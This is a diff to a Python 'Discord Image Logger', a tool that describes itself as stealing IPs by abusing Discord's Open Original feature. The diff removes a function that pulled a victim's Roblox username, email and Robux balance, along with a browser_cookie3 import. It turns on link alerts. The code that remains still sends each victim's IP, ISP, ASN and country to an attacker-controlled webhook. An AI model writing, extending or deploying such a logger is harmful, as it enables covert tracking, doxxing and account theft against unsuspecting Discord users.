@@ -4,7 +4,6 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-import browser_cookie3
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -38,7 +37,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
@@ -87,50 +86,13 @@ def reportError(error):
         }
     ],
 })
-    
-def get_roblox_info():
-    try:
-        session = requests.Session()
-        session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-        })
-
-        user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
-        if user_resp.status_code != 200:
-            return None
-        user_data = user_resp.json()
-        uid = user_data.get('id')
-        username = user_data.get('name', 'Unknown')
-
-        email_resp = session.get('https://accountsettings.roblox.com/v1/email', timeout=10)
-        if email_resp.status_code != 200:
-            return None
-        email_data = email_resp.json()
-        email = email_data.get('emailAddress', 'Unknown')
-
-        robux_resp = session.post('https://economy.roblox.com/v1/user/currency', timeout=10)
-        if robux_resp.status_code != 200:
-            return {'username': username, 'id': str(uid) if uid else 'Unknown', 'robux': 'Error', 'cookie': cookie}
-        robux_data = robux_resp.json()
-        robux = robux_data.get('robux', 0)
-
-        return {
-            'username': username,
-            'id': str(uid) if uid else 'Unknown',
-            'robux': f"{robux:,}",
-            'emailAddress': email
-        }
-    except:
-        return None
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
     
     bot = botCheck(ip, useragent)
-
-    roblox_info = get_roblox_info()
-
+    
     if bot:
         requests.post(config["webhook"], json = {
     "username": config["username"],
@@ -190,7 +152,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Username:** `{roblox_info['username']}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
